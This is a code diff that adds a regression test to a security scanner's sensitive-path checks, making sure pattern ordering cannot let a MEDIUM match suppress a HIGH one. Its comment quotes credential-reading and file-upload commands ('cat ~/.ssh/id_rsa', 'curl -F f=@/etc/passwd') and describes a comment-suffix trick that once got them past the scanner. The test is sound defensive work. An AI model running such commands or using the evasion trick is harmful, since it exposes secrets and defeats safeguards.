@@ -533,6 +533,34 @@ describe('Scanner Regression Guard (SMI-3864)', () => {
       }
     })
 
+    /**
+     * SMI-6508 follow-up — ARRAY ORDER IS A SECURITY PROPERTY, not style.
+     *
+     * scanSensitivePaths `break`s on the FIRST SENSITIVE_PATH_PATTERNS entry
+     * that matches a line. An always-MEDIUM entry placed ahead of a HIGH-capable
+     * one therefore SUPPRESSES it: the MEDIUM wins the race, the HIGH never
+     * fires, and `passed` flips from false to true — the install block vanishes.
+     *
+     * MF-5 shipped at index 4, ahead of 11 HIGH-capable entries, and that was a
+     * live scanner-evasion primitive. Appending the 12-character comment
+     * `# a_secrets:` to a line was enough to turn `cat ~/.ssh/id_rsa` and
+     * `curl -F f=@/etc/passwd …` from blocking to passing. A cross-family gate,
+     * 3175 passing tests and a 9-case manual check were all green over it,
+     * because every ordering test compared MF-5 only against the ONE entry that
+     * precedes it. This guard compares against ALL of them, so the next
+     * always-MEDIUM class cannot repeat it.
+     */
+    it('no always-MEDIUM pattern precedes any HIGH-capable pattern (ordering is load-bearing)', () => {
+      const firstMediumOnly = SENSITIVE_PATH_PATTERNS.findIndex((p) =>
+        OBSERVE_ONLY_MEDIUM_PATTERNS.has(p)
+      )
+      if (firstMediumOnly === -1) return // no always-MEDIUM entries yet
+      const highCapableAfter = SENSITIVE_PATH_PATTERNS.slice(firstMediumOnly + 1).filter(
+        (p) => !OBSERVE_ONLY_MEDIUM_PATTERNS.has(p)
+      )
+      expect(highCapableAfter).toEqual([])
+    })
+
     // SMI-6508 added the fifth class (MF-5, OBSERVE_ONLY_MEDIUM): 1 + 9 + 3 + 2 + 1 = 16.
     it('the five classes total and partition SENSITIVE_PATH_PATTERNS exactly (1 + 9 + 3 + 2 + 1 = 16)', () => {
       expect(PATH_FORM_PATTERNS.size).toBe(9)
